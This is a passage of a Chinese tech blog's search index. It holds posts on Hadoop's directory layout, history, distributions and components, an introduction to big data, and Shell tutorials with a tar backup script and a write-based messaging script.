class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 hadoop-3.3.4]# ll</span><br><span class="line">总用量 92</span><br><span class="line">drwxr-xr-x. 2 1024 1024   203 7月  29 21:44 bin</span><br><span class="line">drwxr-xr-x. 3 1024 1024    20 7月  29 20:35 etc</span><br><span class="line">drwxr-xr-x. 2 1024 1024   106 7月  29 21:44 include</span><br><span class="line">drwxr-xr-x. 3 1024 1024    20 7月  29 21:44 lib</span><br><span class="line">drwxr-xr-x. 4 1024 1024   288 7月  29 21:44 libexec</span><br><span class="line">-rw-rw-r--. 1 1024 1024 24707 7月  29 04:30 LICENSE-binary</span><br><span class="line">drwxr-xr-x. 2 1024 1024  4096 7月  29 21:44 licenses-binary</span><br><span class="line">-rw-rw-r--. 1 1024 1024 15217 7月  17 02:20 LICENSE.txt</span><br><span class="line">-rw-rw-r--. 1 1024 1024 29473 7月  17 02:20 NOTICE-binary</span><br><span class="line">-rw-rw-r--. 1 1024 1024  1541 4月  22 2022 NOTICE.txt</span><br><span class="line">-rw-rw-r--. 1 1024 1024   175 4月  22 2022 README.txt</span><br><span class="line">drwxr-xr-x. 3 1024 1024  4096 7月  29 20:35 sbin</span><br><span class="line">drwxr-xr-x. 4 1024 1024    31 7月  29 22:21 share</span><br></pre></td></tr></table></figure><h2 id="5-2-重要目录"><a href="#5-2-重要目录" class="headerlink" title="5.2 重要目录"></a>5.2 重要目录</h2><p>（1）bin目录：存放对Hadoop相关服务（hdfs，yarn，mapred）进行操作的脚本</p><p>（2）etc目录：Hadoop的配置文件目录，存放Hadoop的配置文件</p><p>（3）lib目录：存放Hadoop的本地库（对数据进行压缩解压缩功能）</p><p>（4）sbin目录：存放启动或停止Hadoop相关服务的脚本</p><p>（5）share目录：存放Hadoop的依赖jar包、文档、和官方案例</p>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hadoop 概述</title>
      <link href="/blog/c3c14e7.html/"/>
      <url>/blog/c3c14e7.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：Hadoop简介"><a href="#一：Hadoop简介" class="headerlink" title="一：Hadoop简介"></a>一：Hadoop简介</h1><ul><li>Hadoop是一个由Apache基金会所开发的分布式系统基础架构。</li><li>主要解决，海量数据的存储和海量数据的分析计算问题。</li><li>广义来说，Hadoop通常是指一个更广泛的概念——Hadoop生态圈。</li></ul><p><img src="/blog/c3c14e7.html/image-20221213085502535.png"></p><h1 id="二：Hadoop发展历史"><a href="#二：Hadoop发展历史" class="headerlink" title="二：Hadoop发展历史"></a>二：Hadoop发展历史</h1><ul><li>Hadoop创始人Doug Cutting，为 了实 现与Google类似的全文搜索功能，他在Lucene框架基础上进行优 化升级，查询引擎和索引引擎。</li><li>2001年年底Lucene成为Apache基金会的一个子项目。</li><li>对于海量数据的场景，Lucene框 架面 对与Google同样的困难，存 储海量数据困难，检 索海 量速度慢。</li><li>学习和模仿Google解决这些问题的办法 ：微型版Nutch。</li><li>可以说Google是Hadoop的思想之源（Google在大数据方面的三篇论文） <ul><li>GFS —&gt;HDFS </li><li>Map-Reduce —&gt;MR </li><li>BigTable —&gt;HBase</li></ul></li><li>2003-2004年，Google公开了部分GFS和MapReduce思想的细节，以此为基础Doug Cutting等人用 了2年业余时间实现了DFS和MapReduce机制，使Nutch性能飙升。</li><li>2005 年Hadoop 作为 Lucene的子项目 Nutch的一部分正式引入Apache基金会。</li><li>2006 年 3 月份，Map-Reduce和Nutch Distributed File System （NDFS）分别被纳入到 Hadoop 项目 中，Hadoop就此正式诞生，标志着大数据时代来临。</li><li>名字来源于Doug Cutting儿子的玩具大象。</li></ul><h1 id="三：Hadoop三大发行版本"><a href="#三：Hadoop三大发行版本" class="headerlink" title="三：Hadoop三大发行版本"></a>三：Hadoop三大发行版本</h1><p>Hadoop 三大发行版本：Apache、Cloudera、Hortonworks。</p><p>Apache 版本最原始（最基础）的版本，对于入门学习最好。2006</p><p>Cloudera 内部集成了很多大数据框架，对应产品 CDH。2008</p><p>Hortonworks 文档较好，对应产品 HDP。2011</p><p>Hortonworks 现在已经被 Cloudera 公司收购，推出新的品牌 CDP。</p><h2 id="1）Apache-Hadoop"><a href="#1）Apache-Hadoop" class="headerlink" title="1）Apache Hadoop"></a>1）Apache Hadoop</h2><p>官网地址：<a href="http://hadoop.apache.org/">http://hadoop.apache.org</a> </p><p>下载地址：<a href="https://hadoop.apache.org/releases.html">https://hadoop.apache.org/releases.html</a></p><h2 id="2）Cloudera-Hadoop"><a href="#2）Cloudera-Hadoop" class="headerlink" title="2）Cloudera Hadoop"></a>2）Cloudera Hadoop</h2><p>官网地址：<a href="https://www.cloudera.com/downloads/cdh">https://www.cloudera.com/downloads/cdh</a> </p><p>下载地址：<a href="https://docs.cloudera.com/">https://docs.cloudera.com/</a></p><p>（1）2008 年成立的 Cloudera 是最早将 Hadoop 商用的公司，为合作伙伴提供 Hadoop 的 商用解决方案，主要是包括支持、咨询服务、培训。 </p><p>（2）2009 年 Hadoop 的创始人 Doug Cutting 也加盟 Cloudera 公司。Cloudera 产品主 要为 CDH，Cloudera Manager，Cloudera Support </p><p>（3）CDH 是 Cloudera 的 Hadoop 发行版，完全开源，比 Apache Hadoop 在兼容性，安 全性，稳定性上有所增强。Cloudera 的标价为每年每个节点 10000 美元。 </p><p>（4）Cloudera Manager 是集群的软件分发及管理监控平台，可以在几个小时内部署好一 个 Hadoop 集群，并对集群的节点及服务进行实时监控。</p><h2 id="3）Hortonworks-Hadoop"><a href="#3）Hortonworks-Hadoop" class="headerlink" title="3）Hortonworks Hadoop"></a>3）Hortonworks Hadoop</h2><p>官网地址：<a href="https://hortonworks.com/products/data-center/hdp/">https://hortonworks.com/products/data-center/hdp/</a> </p><p>下载地址：<a href="https://hortonworks.com/downloads/#data-platform">https://hortonworks.com/downloads/#data-platform</a> </p><p>（1）2011 年成立的 Hortonworks 是雅虎与硅谷风投公司 Benchmark Capital 合资组建。 </p><p>（2）公司成立之初就吸纳了大约 25 名至 30 名专门研究 Hadoop 的雅虎工程师，上述 工程师均在 2005 年开始协助雅虎开发 Hadoop，贡献了 Hadoop80%的代码。 </p><p>（3）Hortonworks 的主打产品是 Hortonworks Data Platform（HDP），也同样是 100%开 源的产品，HDP 除常见的项目外还包括了 Ambari，一款开源的安装和管理系统。 </p><p>（4）2018 年 Hortonworks 目前已经被 Cloudera 公司收购。</p><h1 id="四：Hadoop优势"><a href="#四：Hadoop优势" class="headerlink" title="四：Hadoop优势"></a>四：Hadoop优势</h1><h2 id="4-1-高可靠性"><a href="#4-1-高可靠性" class="headerlink" title="4.1 高可靠性"></a>4.1 高可靠性</h2><p>Hadoop底层维护多个数据副本，所以即使Hadoop某个计算元 素或存储出现故障，也不会导致数据的丢失。</p><p><img src="/blog/c3c14e7.html/image-20221213090433180.png"></p><h2 id="4-2-高扩展性"><a href="#4-2-高扩展性" class="headerlink" title="4.2 高扩展性"></a>4.2 高扩展性</h2><p>在集群间分配任务数据，可方便的扩展数以千计的节点。可以做到动态增加服务器数量。</p><p><img src="/blog/c3c14e7.html/image-20221213090533915.png"></p><h2 id="4-3-高效性"><a href="#4-3-高效性" class="headerlink" title="4.3 高效性"></a>4.3 高效性</h2><p>在MapReduce的思想下，Hadoop是并行工作的，以加快任务处 理速度。</p><p><img src="/blog/c3c14e7.html/image-20221213090616742.png"></p><h2 id="4-4-高容错性"><a href="#4-4-高容错性" class="headerlink" title="4.4 高容错性"></a>4.4 高容错性</h2><p>能够自动将失败的任务重新分配。</p><p><img src="/blog/c3c14e7.html/image-20221213090710881.png"></p><h1 id="五：Hadoop组成"><a href="#五：Hadoop组成" class="headerlink" title="五：Hadoop组成"></a>五：Hadoop组成</h1><h2 id="5-1-Hadoop1-x、2-x、3-x区别"><a href="#5-1-Hadoop1-x、2-x、3-x区别" class="headerlink" title="5.1 Hadoop1.x、2.x、3.x区别"></a>5.1 Hadoop1.x、2.x、3.x区别</h2><p><img src="/blog/c3c14e7.html/image-20221213090813605.png"></p><h2 id="5-2-HDFS-架构概述"><a href="#5-2-HDFS-架构概述" class="headerlink" title="5.2 HDFS 架构概述"></a>5.2 HDFS 架构概述</h2><p>Hadoop Distributed File System，简称 HDFS，是一个分布式文件系统。</p><ul><li>NameNode（nn）：存储文件的元数据，如文件名，文件目录结构，文件属性（生成时间、副本数、 文件权限），以及每个文件的块列表和块所在的DataNode等。</li></ul><p><img src="/blog/c3c14e7.html/image-20221213091121335.png"></p><ul><li>DataNode(dn)：在本地文件系统存储文件块数据，以及块数据的校验和。</li></ul><p><img src="/blog/c3c14e7.html/image-20221213091137842.png"></p><ul><li>Secondary NameNode(2nn)：每隔一段时间对NameNode元数据备份。</li></ul><h2 id="5-3-YARN-架构概述"><a href="#5-3-YARN-架构概述" class="headerlink" title="5.3 YARN 架构概述"></a>5.3 YARN 架构概述</h2><p>Yet Another Resource Negotiator 简称 YARN ，另一种资源协调者，是 Hadoop 的资源管理器。</p><p><img src="/blog/c3c14e7.html/image-20221213091320149.png"></p><h2 id="5-4-MapReduce-架构概述"><a href="#5-4-MapReduce-架构概述" class="headerlink" title="5.4 MapReduce 架构概述"></a>5.4 MapReduce 架构概述</h2><p>MapReduce 将计算过程分为两个阶段：Map 和 Reduce </p><p>1）Map 阶段并行处理输入数据 </p><p>2）Reduce 阶段对 Map 结果进行汇总</p><p><img src="/blog/c3c14e7.html/image-20221213091510749.png"></p><h2 id="5-5-HDFS、YARN、MapReduce-三者关系"><a href="#5-5-HDFS、YARN、MapReduce-三者关系" class="headerlink" title="5.5 HDFS、YARN、MapReduce 三者关系"></a>5.5 HDFS、YARN、MapReduce 三者关系</h2><p><img src="/blog/c3c14e7.html/image-20221213091616065.png"></p><h1 id="六：Hadoop生态体系"><a href="#六：Hadoop生态体系" class="headerlink" title="六：Hadoop生态体系"></a>六：Hadoop生态体系</h1><h2 id="6-1-生态体系介绍"><a href="#6-1-生态体系介绍" class="headerlink" title="6.1 生态体系介绍"></a>6.1 生态体系介绍</h2><p><img src="/blog/c3c14e7.html/image-20221213091817906.png"></p><p>1）Sqoop：Sqoop 是一款开源的工具，主要用于在 Hadoop、Hive 与传统的数据库（MySQL） 间进行数据的传递，可以将一个关系型数据库（例如 ：MySQL，Oracle 等）中的数据导进 到 Hadoop 的 HDFS 中，也可以将 HDFS 的数据导进到关系型数据库中。 </p><p>2）Flume：Flume 是一个高可用的，高可靠的，分布式的海量日志采集、聚合和传输的系统， Flume 支持在日志系统中定制各类数据发送方，用于收集数据； </p><p>3）Kafka：Kafka 是一种高吞吐量的分布式发布订阅消息系统；</p><p>4）Spark：Spark 是当前最流行的开源大数据内存计算框架。可以基于 Hadoop 上存储的大数 据进行计算。 </p><p>5）Flink：Flink 是当前最流行的开源大数据内存计算框架。用于实时计算的场景较多。 </p><p>6）Oozie：Oozie 是一个管理 Hadoop 作业（job）的工作流程调度管理系统。 </p><p>7）Hbase：HBase 是一个分布式的、面向列的开源数据库。HBase 不同于一般的关系数据库， 它是一个适合于非结构化数据存储的数据库。 </p><p>8）Hive：Hive 是基于 Hadoop 的一个数据仓库工具，可以将结构化的数据文件映射为一张 数据库表，并提供简单的 SQL 查询功能，可以将 SQL 语句转换为 MapReduce 任务进行运 行。其优点是学习成本低，可以通过类 SQL 语句快速实现简单的 MapReduce 统计，不必开 发专门的 MapReduce 应用，十分适合数据仓库的统计分析。 </p><p>9）ZooKeeper：它是一个针对大型分布式系统的可靠协调系统，提供的功能包括：配置维护、 名字服务、分布式同步、组服务等。</p><h2 id="6-2-推荐系统架构图"><a href="#6-2-推荐系统架构图" class="headerlink" title="6.2 推荐系统架构图"></a>6.2 推荐系统架构图</h2><p><img src="/blog/c3c14e7.html/image-20221213092214171.png"></p>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hadoop 大数据概论</title>
      <link href="/blog/d983fcd2.html/"/>
      <url>/blog/d983fcd2.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：大数据概念"><a href="#一：大数据概念" class="headerlink" title="一：大数据概念"></a>一：大数据概念</h1><h2 id="1-1-概述"><a href="#1-1-概述" class="headerlink" title="1.1 概述"></a>1.1 概述</h2><ul><li>大数据（Big Data）：指无法在一定时间范围内用常规软件工具进行捕捉、管理和 处理的数据集合，是需要新处理模式才能具有更强的决策力、洞察发现力和流程优化 能力的海量、高增长率和多样化的信息资产。</li><li>大数据主要解决，海量数据的<code>采集</code>、<code>存储</code>和<code>分析计算</code>问题。</li></ul><h2 id="1-2-存储单位"><a href="#1-2-存储单位" class="headerlink" title="1.2 存储单位"></a>1.2 存储单位</h2><ul><li><p>按顺序给出数据存储单位：bit、Byte、 KB、MB、GB、TB、PB、EB、ZB、YB、 BB、NB、DB。</p></li><li><p>1Byte &#x3D; 8bit 1K &#x3D; 1024Byte 1MB &#x3D; 1024K 1G &#x3D; 1024M 1T &#x3D; 1024G 1P &#x3D; 1024T</p></li></ul><h1 id="二：大数据特点"><a href="#二：大数据特点" class="headerlink" title="二：大数据特点"></a>二：大数据特点</h1><h2 id="2-1-Volume（大量）"><a href="#2-1-Volume（大量）" class="headerlink" title="2.1 Volume（大量）"></a>2.1 Volume（大量）</h2><p>截至目前，人类生产的所有印刷材料的数据量是200PB，而历史上全人类总共 说过的话的数据量大约是5EB。当前，典型个人计算机硬盘的容量为TB量级，而 一些大企业的数据量已经接近EB量级。</p><h2 id="2-2-Velocity（高速）"><a href="#2-2-Velocity（高速）" class="headerlink" title="2.2 Velocity（高速）"></a>2.2 Velocity（高速）</h2><p>这是大数据区分于传统数据挖掘的最显著特征。根据IDC的“数字宇宙”的报告，预计到2025年，全球数据使用量将达到163ZB。在如此海量的数据面前，处理数据的效率就是企业的生命。 </p><ul><li>天猫双十一：<ul><li>2017年3分01秒，天猫交易额超过100亿 </li><li>2020年96秒，天猫交易额超过100亿</li></ul></li></ul><h2 id="2-3-Variety（多样）"><a href="#2-3-Variety（多样）" class="headerlink" title="2.3 Variety（多样）"></a>2.3 Variety（多样）</h2><ul><li>这种类型的多样性也让数据被分为<code>结构化数据</code>和<code>非结构化数据</code>。</li><li>相对于以往便于存储的 以数据库&#x2F;文本为主的结构化数据，非结构化数据越来越多，包括网络日志、音频、视频、图 片、地理位置信息等，这些多类型的数据对数据的处理能力提出了更高要求。</li></ul><h2 id="2-4-Value（低价值密度）"><a href="#2-4-Value（低价值密度）" class="headerlink" title="2.4 Value（低价值密度）"></a>2.4 Value（低价值密度）</h2><ul><li>价值密度的高低与数据总量的大小成反比。</li><li>如何快速对有价值数 据“提纯”成为目前大数据背景下待解决的难题。</li></ul><h1 id="三：大数据应用场景"><a href="#三：大数据应用场景" class="headerlink" title="三：大数据应用场景"></a>三：大数据应用场景</h1><ul><li>抖音：推荐的都是你喜欢的视频</li><li>电商站内广告推荐：给用户推荐可能喜欢的商品</li><li>零售：分析用户消费习惯，为用户购买商品提供方便，从而提升商品销量。 经典案例，纸尿布+啤酒。</li><li>物流仓储：京东物流，上午下单下午送达、下午下单次日上午送达；</li><li>保险：海量数据挖掘及风险预测，助力保险 行业精准营销，提升精细化定价能力。</li><li>金融：多维度体现用户特征，帮助金融机构 推荐优质客户，防范欺诈风险。</li><li>房产：大数据全面助力房地产行业，打造精 准投策与营销，选出更合适的地，建造更合适的楼， 卖给更合适的人。</li><li>人工智能 + 5G + 物联网 + 虚拟与现实</li></ul><h1 id="四：大数据发展前景"><a href="#四：大数据发展前景" class="headerlink" title="四：大数据发展前景"></a>四：大数据发展前景</h1><ul><li>党的十九大提出“推动互联网、大数据、人工智能和实体经济深度融合”。</li><li>2020年初，中央推出34万亿“新基建”投资计划</li></ul><p><img src="/blog/d983fcd2.html/image-20221213010047791.png"></p><ul><li>2020年是5G的元年，国家在大力铺设5G设备，2021年就是5G手机应用的开 始，也是大数据要爆发的1年。5G带来的是每秒钟10g的数据，会给每家公司都 带来海量的数据。那么传统的Java工具根本解决不了海量数据的存储。就更不用 说海量数据的计算了。</li><li>人才紧缺、竞争压力小<ul><li>有句话叫：“选择大于努力”选择一个好的方向，少奋斗十年。是否记得 国家在2017年才开设大数据课程，当时是北京大学、人民大学等25所高校开设 第一批大数据课程。</li></ul></li><li>Boss直聘网站上的部分大数据工程师薪资水平</li></ul><h1 id="五：大数据部门业务流程分析"><a href="#五：大数据部门业务流程分析" class="headerlink" title="五：大数据部门业务流程分析"></a>五：大数据部门业务流程分析</h1><p><img src="/blog/d983fcd2.html/image-20221213010323402.png"></p><h1 id="六：大数据部门内部组织结构"><a href="#六：大数据部门内部组织结构" class="headerlink" title="六：大数据部门内部组织结构"></a>六：大数据部门内部组织结构</h1><p><img src="/blog/d983fcd2.html/image-20221213010352060.png"></p>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell 应用案例</title>
      <link href="/blog/f2380f63.html/"/>
      <url>/blog/f2380f63.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：归档文件"><a href="#一：归档文件" class="headerlink" title="一：归档文件"></a>一：归档文件</h1><h2 id="1-1-功能描述"><a href="#1-1-功能描述" class="headerlink" title="1.1 功能描述"></a>1.1 功能描述</h2><p>实现一个每天对指定目录归档备份的脚本，输入一个目录名称（末尾不带&#x2F;）， 将目录下所有文件按天归档保存，并将归档日期附加在归档文件名上，放在&#x2F;root&#x2F;archive 下。</p><h2 id="1-2-相关技术"><a href="#1-2-相关技术" class="headerlink" title="1.2 相关技术"></a>1.2 相关技术</h2><ul><li>这里用到了归档命令：<ul><li>tar 后面可以加上-c 选项表示归档，</li><li>加上-z 选项表示同时进行压缩，得到的文件后缀名 为.tar.gz。</li></ul></li></ul><h2 id="1-3-脚本实现"><a href="#1-3-脚本实现" class="headerlink" title="1.3 脚本实现"></a>1.3 脚本实现</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">判断输入参数个数是否为1</span></span><br><span class="line">if [ $# -ne 1 ]</span><br><span class="line">then</span><br><span class="line">        echo &quot;参数个数错误！请输入一个参数，作为归档的目录名称&quot;</span><br><span class="line">        exit</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">判断目录是否存在</span></span><br><span class="line">if [ -d $1 ]</span><br><span class="line">then</span><br><span class="line">        echo</span><br><span class="line">else</span><br><span class="line">        echo &quot;目录不存在&quot;</span><br><span class="line">        exit</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">DIR_NAME=$(basename $1)</span><br><span class="line">DIR_PATH=$(cd $(dirname $1); pwd)</span><br><span class="line"></span><br><span class="line">echo DIR_NAME:$DIR_NAME</span><br><span class="line">echo DIR_PATH:$DIR_PATH</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取当前日期</span></span><br><span class="line">DATE=$(date +%Y-%m-%d)</span><br><span class="line">echo $DATE</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">定义生成归档文件的名称</span></span><br><span class="line">FILE=archive_$&#123;DIR_NAME&#125;_$DATE.tar.gz</span><br><span class="line">DEST=/root/RupertTears/archive/$FILE</span><br><span class="line"></span><br><span class="line">echo $FILE</span><br><span class="line">echo $DEST</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始归档目录文件</span></span><br><span class="line">echo &quot;开始归档...&quot;</span><br><span class="line">tar -czf $DEST $DIR_PATH/$DIR_NAME</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">校验归档结果</span></span><br><span class="line">if [  $? -eq 0 ]</span><br><span class="line">then</span><br><span class="line">        echo &quot;归档成功！&quot;</span><br><span class="line">        echo &quot;归档文件为：$DEST&quot;</span><br><span class="line">else</span><br><span class="line">        echo &quot;归档失败！&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">exit</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="二：发送消息"><a href="#二：发送消息" class="headerlink" title="二：发送消息"></a>二：发送消息</h1><h2 id="2-1-功能描述"><a href="#2-1-功能描述" class="headerlink" title="2.1 功能描述"></a>2.1 功能描述</h2><p>实现一个向某个用户快速发送消息的脚本，输入用户名作为第一个参数，后面直 接跟要发送的消息。脚本需要检测用户是否登录在系统中、是否打开消息功能，以及当前发 送消息是否为空</p><h2 id="2-2-相关技术"><a href="#2-2-相关技术" class="headerlink" title="2.2 相关技术"></a>2.2 相关技术</h2><p>我们可以利用 Linux 自带的 mesg 和 write 工具，向其它用户发送消息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# who am i</span><br><span class="line">root     pts/0        2022-12-12 01:14 (172.16.80.1)</span><br><span class="line">[root@hadoop100 shell]# who </span><br><span class="line">root     pts/0        2022-12-12 01:14 (172.16.80.1)</span><br><span class="line">ghost    :0           2022-12-12 01:37 (:0)</span><br><span class="line">ghost    pts/1        2022-12-12 01:38 (:0)</span><br><span class="line">[root@hadoop100 shell]# who -T</span><br><span class="line">root     + pts/0        2022-12-12 01:14 (172.16.80.1)</span><br><span class="line">ghost    ? :0           2022-12-12 01:37 (:0)</span><br><span class="line">ghost    + pts/1        2022-12-12 01:38 (:0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@hadoop100 shell]# mesg n</span><br><span class="line">[root@hadoop100 shell]# who -T</span><br><span class="line">root     - pts/0        2022-12-12 01:14 (172.16.80.1)</span><br><span class="line">ghost    ? :0           2022-12-12 01:37 (:0)</span><br><span class="line">ghost    + pts/1        2022-12-12 01:38 (:0)</span><br><span class="line">[root@hadoop100 shell]# mesg y</span><br><span class="line">[root@hadoop100 shell]# who -T</span><br><span class="line">root     + pts/0        2022-12-12 01:14 (172.16.80.1)</span><br><span class="line">ghost    ? :0           2022-12-12 01:37 (:0)</span><br><span class="line">ghost    + pts/1        2022-12-12 01:38 (:0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@hadoop100 shell]# write ghost pts/1</span><br><span class="line">hello</span><br><span class="line">welcome</span><br></pre></td></tr></table></figure><h2 id="2-3-脚本实现"><a href="#2-3-脚本实现" class="headerlink" title="2.3 脚本实现"></a>2.3 脚本实现</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">login_user=$(who | grep -i -m 1  $1  | awk &#x27;&#123;print $1&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">if [ -z $login_user ]</span><br><span class="line">then</span><br><span class="line">        echo &quot;$1 不在线&quot;</span><br><span class="line">        echo &quot;脚本退出...&quot;</span><br><span class="line">        exit</span><br><span class="line">else</span><br><span class="line">        echo $login_user</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">is_allowed=$(who -T | grep -i -m 2 $1 | awk &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">if [ $is_allowed != &quot;+&quot;  ]</span><br><span class="line">then</span><br><span class="line">        echo &quot;$1 没有开启消息功能&quot;</span><br><span class="line">        echo &quot;脚本退出...&quot;</span><br><span class="line">        exit</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if [ -z $2 ]</span><br><span class="line">then</span><br><span class="line">        echo &quot;没有消息体&quot;</span><br><span class="line">        echo &quot;脚本退出&quot;</span><br><span class="line">        exit</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">whole_msg=$(echo $* | cut -d &quot; &quot; -f 2-)</span><br><span class="line"></span><br><span class="line">user_terminal=$(who | grep -i -m 1 $1 | awk &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">echo $whole_msg | write $login_user $user_terminal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if [ $? != 0  ]</span><br><span class="line">then</span><br><span class="line">        echo &quot;发送失败！&quot;</span><br><span class="line">else</span><br><span class="line">        echo &quot;发送成功！&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@hadoop100 shell]# ./send_msg.sh ghost hello</span><br><span class="line">ghost</span><br><span class="line">发送成功！</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell 文本处理工具</title>
      <link href="/blog/60b4c2ae.html/"/>
      <url>/blog/60b4c2ae.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：cut"><a href="#一：cut" class="headerlink" title="一：cut"></a>一：cut</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><ul><li>cut 的工作就是“剪”，具体的说就是在文件中负责剪切数据用的。</li><li>cut 命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段输出。</li></ul><h2 id="1-2-基本用法"><a href="#1-2-基本用法" class="headerlink" title="1.2 基本用法"></a>1.2 基本用法</h2><ul><li>cut [选项参数] filename </li><li>说明：默认分隔符是制表符</li></ul><h2 id="1-3-选项参数说明"><a href="#1-3-选项参数说明" class="headerlink" title="1.3 选项参数说明"></a>1.3 选项参数说明</h2><p><img src="/blog/60b4c2ae.html/image-20221212003218171.png"></p><h2 id="1-4-案例实操"><a href="#1-4-案例实操" class="headerlink" title="1.4 案例实操"></a>1.4 案例实操</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 